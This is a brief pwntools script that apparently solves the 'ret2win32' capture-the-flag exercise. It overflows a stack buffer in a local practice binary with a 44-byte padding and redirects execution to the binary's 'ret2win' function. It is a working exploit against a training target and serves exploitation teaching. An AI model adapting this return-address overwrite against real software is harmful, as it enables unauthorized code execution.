from pwn import *

offset = 44

context.binary = elf = ELF('./ret2win32')

p = elf.process()

payload = b'A'*offset + p32(elf.sym['ret2win'])

p.recv()
p.sendline(payload)

log.info(p.recvall())

